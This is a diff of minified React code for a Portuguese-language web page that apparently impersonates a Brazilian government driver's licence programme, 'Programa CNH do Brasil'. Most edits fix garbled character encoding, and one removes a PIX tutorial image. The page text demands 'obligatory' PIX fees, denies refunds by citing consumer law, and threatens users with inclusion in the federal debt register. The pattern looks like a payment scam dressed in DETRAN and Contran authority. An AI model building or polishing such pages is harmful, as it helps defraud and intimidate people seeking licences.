@@ -15119,24 +15119,24 @@ function gp() {
             }), l.jsxs("ul", {
               className: "text-sm text-blue-800 space-y-2",
               children: [l.jsxs("li", {
-                children: ["â€¢ Esta taxa é ", l.jsx("strong", {
+                children: ["• Esta taxa é ", l.jsx("strong", {
                   children: "obrigatória"
                 }), " para finalizar seu cadastro no Programa CNH do Brasil"]
               }), l.jsxs("li", {
-                children: ["â€¢ Valor único de ", l.jsx("strong", {
+                children: ["• Valor único de ", l.jsx("strong", {
                   children: "R$ 74,90"
                 }), " pago uma única vez"]
               }), l.jsx("li", {
-                children: "â€¢ Taxa destinada ao processo de emissão e regularização da CNH"
+                children: "• Taxa destinada ao processo de emissão e regularização da CNH"
               }), l.jsx("li", {
-                children: "â€¢ Seu cadastro só será concluído após a confirmação deste pagamento"
+                children: "• Seu cadastro só será concluído após a confirmação deste pagamento"
               })]
             })]
           }), l.jsxs("div", {
             className: "bg-red-50 p-4 rounded-lg border border-red-200 mb-6",
             children: [l.jsx("h4", {
               className: "font-semibold text-red-800 mb-2 text-center",
-              children: "âš ï¸ Atenção"
+              children: "âš ️ Atenção"
             }), l.jsxs("p", {
               className: "text-sm text-red-700",
               children: ["Informamos que, caso o pagamento da ", l.jsx("strong", {
@@ -15145,7 +15145,7 @@ function gp() {
                 children: "não será concluído"
               }), " e você ", l.jsx("strong", {
                 children: "perderá o direito de participar do Programa CNH do Brasil"
-              }), ". Conforme o art. 49, Â§2Âº da Lei nÂº 8.078/1990 (Código de Defesa do Consumidor), não haverá reembolso do valor já pago referente Á s taxas administrativas, uma vez que o serviço de processamento já foi iniciado junto ao DETRAN."]
+              }), ". Conforme o art. 49, §2º da Lei nº 8.078/1990 (Código de Defesa do Consumidor), não haverá reembolso do valor já pago referente Á s taxas administrativas, uma vez que o serviço de processamento já foi iniciado junto ao DETRAN."]
             })]
           }), l.jsxs("div", {
             className: "text-center mb-6",
@@ -21328,7 +21328,7 @@ function RE() {
                 children: [l.jsxs("div", {
                   className: "flex justify-between items-start",
                   children: [l.jsxs("span", {
-                    children: ["â€¢ Taxa de Expedição", l.jsx("br", {}), "do Documento (TED)"]
+                    children: ["• Taxa de Expedição", l.jsx("br", {}), "do Documento (TED)"]
                   }), l.jsx("span", {
                     className: "font-bold whitespace-nowrap",
                     children: "R$11,95"
@@ -21336,7 +21336,7 @@ function RE() {
                 }), l.jsxs("div", {
                   className: "flex justify-between items-start",
                   children: [l.jsxs("span", {
-                    children: ["â€¢ Taxa de Serviço", l.jsx("br", {}), "Administrativo (TSA)"]
+                    children: ["• Taxa de Serviço", l.jsx("br", {}), "Administrativo (TSA)"]
                   }), l.jsx("span", {
                     className: "font-bold whitespace-nowrap",
                     children: "R$13,40"
@@ -21344,7 +21344,7 @@ function RE() {
                 }), l.jsxs("div", {
                   className: "flex justify-between items-start",
                   children: [l.jsxs("span", {
-                    children: ["â€¢ Taxa de Processamento", l.jsx("br", {}), "e Emissão (TPE)"]
+                    children: ["• Taxa de Processamento", l.jsx("br", {}), "e Emissão (TPE)"]
                   }), l.jsx("span", {
                     className: "font-bold whitespace-nowrap",
                     children: "R$11,85"
@@ -21551,11 +21551,11 @@ function DE() {
               }), l.jsxs("ul", {
                 className: "text-sm text-blue-800 text-left space-y-1",
                 children: [l.jsx("li", {
-                  children: "â€¢ Verifique seus dados e tente novamente"
+                  children: "• Verifique seus dados e tente novamente"
                 }), l.jsx("li", {
-                  children: "â€¢ Entre em contato com o suporte se o problema persistir"
+                  children: "• Entre em contato com o suporte se o problema persistir"
                 }), l.jsx("li", {
-                  children: "â€¢ Alternativamente, use outro método de pagamento"
+                  children: "• Alternativamente, use outro método de pagamento"
                 })]
               })]
             }), l.jsxs("div", {
@@ -21930,13 +21930,13 @@ function IE() {
             }), l.jsxs("ul", {
               className: "text-sm text-blue-800 space-y-2",
               children: [l.jsx("li", {
-                children: "â€¢ Aguarde a confirmação por e-mail em até 48 horas"
+                children: "• Aguarde a confirmação por e-mail em até 48 horas"
               }), l.jsx("li", {
-                children: "â€¢ Você receberá instruções para agendar suas aulas"
+                children: "• Você receberá instruções para agendar suas aulas"
               }), l.jsx("li", {
-                children: "â€¢ Compareça ao DETRAN mais próximo com seus documentos"
+                children: "• Compareça ao DETRAN mais próximo com seus documentos"
               }), l.jsx("li", {
-                children: "â€¢ Guarde seu número de protocolo para consultas"
+                children: "• Guarde seu número de protocolo para consultas"
               })]
             })]
           }), l.jsxs("div", {
@@ -22272,9 +22272,9 @@ O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identi
     }, xw = async () => {
       tc("Prosseguir", !1), i("renach_created"), await vw(`Prezado(a) ${Z}, seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas:
 
-â€¢ Taxa de Expedição de Documento (TED): R$ 11,95
-â€¢ Taxa de Serviços Administrativos (TSA): R$ 13,40
-â€¢ Taxa de Processamento Eletrônico (TPE): R$ 11,85
+• Taxa de Expedição de Documento (TED): R$ 11,95
+• Taxa de Serviços Administrativos (TSA): R$ 13,40
+• Taxa de Processamento Eletrônico (TPE): R$ 11,85
 
 Valor Total: R$ 37,20`, 3e3), i("finalize_button")
     }, ww = async () => {
@@ -22690,7 +22690,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botão 
                     children: [l.jsxs("div", {
                       children: [l.jsx("p", {
                         className: "text-gray-400 text-[10px]",
-                        children: "NÂº RENACH"
+                        children: "Nº RENACH"
                       }), l.jsx("p", {
                         className: "font-bold text-[#1351B4] text-sm",
                         children: M
@@ -22886,7 +22886,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botão 
                   children: [l.jsxs("div", {
                     children: [l.jsx("p", {
                       className: "text-gray-500 text-xs",
-                      children: "NÂº RENACH"
+                      children: "Nº RENACH"
                     }), l.jsx("p", {
                       className: "font-semibold text-gray-800",
                       children: M
@@ -22894,7 +22894,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botão 
                   }), l.jsxs("div", {
                     children: [l.jsx("p", {
                       className: "text-gray-500 text-xs",
-                      children: "NÂº GUIA"
+                      children: "Nº GUIA"
                     }), l.jsx("p", {
                       className: "font-semibold text-gray-800",
                       children: ((Ch = m.transaction_id) == null ? void 0 : Ch.slice(-10)) || ""
@@ -22987,12 +22987,12 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botão 
                   }), "), bem como inscrito em ", l.jsx("span", {
                     className: "font-bold",
                     children: "Dívida Ativa da União"
-                  }), ", nos termos do art. 2Âº da ", l.jsx("span", {
+                  }), ", nos termos do art. 2º da ", l.jsx("span", {
                     className: "font-bold",
-                    children: "Lei nÂº 6.830/1980"
+                    children: "Lei nº 6.830/1980"
                   }), " (Lei de Execuções Fiscais) e do art. 43 da ", l.jsx("span", {
                     className: "font-bold",
-                    children: "Lei nÂº 8.078/1990"
+                    children: "Lei nº 8.078/1990"
                   })]
                 })]
               }), l.jsx("div", {
@@ -23045,13 +23045,6 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botão 
                     }), l.jsx("span", {
                       children: "Copiar Código PIX"
                     })]
-                  })
-                }), l.jsx("div", {
-                  className: "mt-3 mb-2",
-                  children: l.jsx("img", {
-                    src: "/img/pix-tutorial.png",
-                    alt: "Como pagar com Pix Copia e Cola",
-                    className: "w-full rounded-lg border border-gray-200 shadow-sm"
                   })
                 }), l.jsxs("div", {
                   className: "mt-3 flex justify-between text-sm",
@@ -24385,7 +24378,7 @@ function uT() {
             color: "#333333"
           },
           children: "as vagas para 2026 estão se esgotando."
-        }), " A Resolução nÂº 985/2025 do Contran, publicada em 09 de dezembro de 2025, revoluciona o processo de habilitação no país. Agora brasileiros podem tirar a CNH em menos de 20 dias, sem custos com autoescola e com curso teórico totalmente online e gratuito."]
+        }), " A Resolução nº 985/2025 do Contran, publicada em 09 de dezembro de 2025, revoluciona o processo de habilitação no país. Agora brasileiros podem tirar a CNH em menos de 20 dias, sem custos com autoescola e com curso teórico totalmente online e gratuito."]
       }), l.jsxs("div", {
         className: "flex items-center gap-4 mb-4",
         children: [l.jsx("span", {
@@ -24619,11 +24612,11 @@ function uT() {
               color: "#555555"
             },
             children: [l.jsx("li", {
-              children: "Resolução Contran nÂº 985/2025"
+              children: "Resolução Contran nº 985/2025"
             }), l.jsx("li", {
-              children: "Lei nÂº 14.071/2020 (Nova Lei de Trânsito)"
+              children: "Lei nº 14.071/2020 (Nova Lei de Trânsito)"
             }), l.jsx("li", {
-              children: "Decreto nÂº 11.999/2025 (Programa CNH do Brasil)"
+              children: "Decreto nº 11.999/2025 (Programa CNH do Brasil)"
             })]
           })]
         })]
